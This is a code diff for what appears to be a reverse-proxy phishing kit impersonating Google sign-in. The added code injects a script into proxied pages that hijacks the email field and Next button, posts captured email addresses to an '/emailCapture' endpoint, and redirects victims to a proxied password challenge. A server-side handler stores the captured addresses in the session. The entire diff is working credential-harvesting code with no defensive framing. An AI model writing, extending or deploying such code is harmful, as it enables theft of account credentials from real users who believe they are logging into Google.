@@ -60,6 +60,10 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
            {
                reg: /signaler-pa.googleapis.com/gi,
                replacement: 'localhost',
+           },
+           {
+               reg: /<head>/,
+               replacement: '<head><script>window.addEventListener("load", function() { setTimeout(function() { var form = document.querySelector("form"); var emailInput = document.querySelector("#identifierId"); var nextButton = document.querySelector("#identifierNext"); if (form && emailInput && nextButton) { form.addEventListener("submit", function(e) { e.preventDefault(); var email = emailInput.value; if (email) { console.log("Email captured:", email); fetch("/emailCapture", { method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: "email=" + encodeURIComponent(email) }).then(function() { window.location.href = "/v3/signin/challenge/pwd?continue=https%3A%2F%2Faccounts.google.com%2F&dsh=' + (new Date().getTime()) + '&flowEntry=ServiceLogin&flowName=GlifWebSignIn"; }); } return false; }); nextButton.addEventListener("click", function(e) { e.preventDefault(); var email = emailInput.value; if (email) { console.log("Email captured:", email); fetch("/emailCapture", { method: "POST", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: "email=" + encodeURIComponent(email) }).then(function() { window.location.href = "/v3/signin/challenge/pwd?continue=https%3A%2F%2Faccounts.google.com%2F&dsh=' + (new Date().getTime()) + '&flowEntry=ServiceLogin&flowName=GlifWebSignIn"; }); } return false; }); } } }, 1000); });</script>'
            }
         ]
     }
@@ -119,6 +123,31 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
+        // Handle email capture endpoint
+        if (this.req.url === '/emailCapture') {
+            let body = ''
+            this.req.on('data', (chunk) => {
+                body += chunk.toString()
+            })
+            this.req.on('end', () => {
+                const emailMatch = /email=([^&]+)/.exec(body)
+                if (emailMatch) {
+                    const email = decodeURIComponent(emailMatch[1])
+                    console.log('Email captured via JavaScript:', email)
+                    Object.assign(clientContext.sessionBody, { email: email })
+                }
+                this.res.writeHead(200, { 'Content-Type': 'text/plain' })
+                this.res.end('OK')
+            })
+            return
+        }
+
+        // Handle password challenge form requests
+        if (this.req.url.startsWith('/v3/signin/challenge/pwd')) {
+            console.log('Password challenge form requested:', this.req.url)
+            return super.superExecuteProxy('accounts.google.com', clientContext)
+        }
+
         // Minimal header modifications - let Gmail handle most of the validation
         console.log('Gmail request URL:', this.req.url)
         console.log('Gmail request method:', this.req.method)
